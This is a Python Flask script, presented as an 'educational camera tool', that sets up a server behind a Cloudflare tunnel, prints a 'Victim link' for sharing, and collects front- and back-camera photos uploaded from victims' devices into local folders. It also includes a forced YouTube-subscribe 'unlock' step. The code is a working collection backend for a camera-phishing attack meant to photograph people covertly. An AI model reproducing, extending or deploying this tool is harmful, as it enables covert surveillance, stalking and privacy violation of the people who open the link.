#!/usr/bin/env python3
"""
HCO-CAM-TAM - Educational Camera Tool
By Azhar (Hackers Colony)
"""

from flask import Flask, request
import os, time, subprocess
from colorama import Fore, Style, init

init(autoreset=True)

# ---------------- CONFIG ----------------
CLOUDFLARE_TUNNEL = "https://spirituality-sustainable-normal-bones.trycloudflare.com"
YOUTUBE_URL = "https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya"
PORT = 8080
FRONT_LIMIT = 5
BACK_LIMIT = 5
TOTAL_IMAGES = FRONT_LIMIT + BACK_LIMIT

# Flask app
app = Flask(__name__)
os.makedirs("received/front", exist_ok=True)
os.makedirs("received/back", exist_ok=True)

# ---------------- TERMUX UNLOCK FLOW ----------------
def unlock_tool():
    print(Fore.YELLOW + Style.BRIGHT + "\n[*] This tool is locked!" + Style.RESET_ALL)
    print(Fore.CYAN + ">>> Subscribe & Click the Bell Icon to unlock <<<\n" + Style.RESET_ALL)

    for i in range(8, 0, -1):
        print(Fore.MAGENTA + f"Redirecting in {i}..." + Style.RESET_ALL)
        time.sleep(1)

    # Open YouTube
    try:
        subprocess.run(["termux-open-url", YOUTUBE_URL])
    except:
        print(Fore.RED + "[!] Could not auto open YouTube. Open manually: " + YOUTUBE_URL)

    time.sleep(2)
    os.system("clear")
    print("\n" + Fore.RED + Style.BRIGHT + "HCO CAM TAM" + Style.RESET_ALL)
    print(Fore.GREEN + Style.BRIGHT + "by Azhar - Camera Tool\n" + Style.RESET_ALL)
    print(Fore.CYAN + f"[*] Victim link: {CLOUDFLARE_TUNNEL}\n" + Style.RESET_ALL)

# ---------------- FLASK ROUTES ----------------
front_count = 0
back_count = 0

@app.route('/capture', methods=['POST'])
def capture():
    global front_count, back_count

    files = request.files.getlist('images')
    for f in files:
        filename = f.filename.lower()

        if "front" in filename and front_count < FRONT_LIMIT:
            front_count += 1
            save_path = f"received/front/front_{front_count}.jpg"
            f.save(save_path)
            print(Fore.CYAN + f"[Front Cam] {front_count}/{FRONT_LIMIT} received" + Style.RESET_ALL)

        elif "back" in filename and back_count < BACK_LIMIT:
            back_count += 1
            save_path = f"received/back/back_{back_count}.jpg"
            f.save(save_path)
            print(Fore.GREEN + f"[Back Cam] {back_count}/{BACK_LIMIT} received" + Style.RESET_ALL)

    if front_count + back_count >= TOTAL_IMAGES:
        print(Fore.RED + Style.BRIGHT + f"[✔] All {TOTAL_IMAGES} images received successfully!" + Style.RESET_ALL)

    return "Images received!"

@app.route('/')
def index():
    return f"""
    <h1 style='color:red; font-size:48px;'>HCO CAM TAM</h1>
    <p style='color:green; font-size:24px;'>by Azhar - Camera Tool</p>
    <p>Victim link: <a href='{CLOUDFLARE_TUNNEL}' target='_blank'>{CLOUDFLARE_TUNNEL}</a></p>
    """

# ---------------- MAIN ----------------
if __name__ == "__main__":
    unlock_tool()
    print(Fore.YELLOW + f"[*] Flask server running on port {PORT}..." + Style.RESET_ALL)
    print(Fore.CYAN + "[*] Waiting for images to be received..." + Style.RESET_ALL)
    app.run(host="0.0.0.0", port=PORT, debug=False)
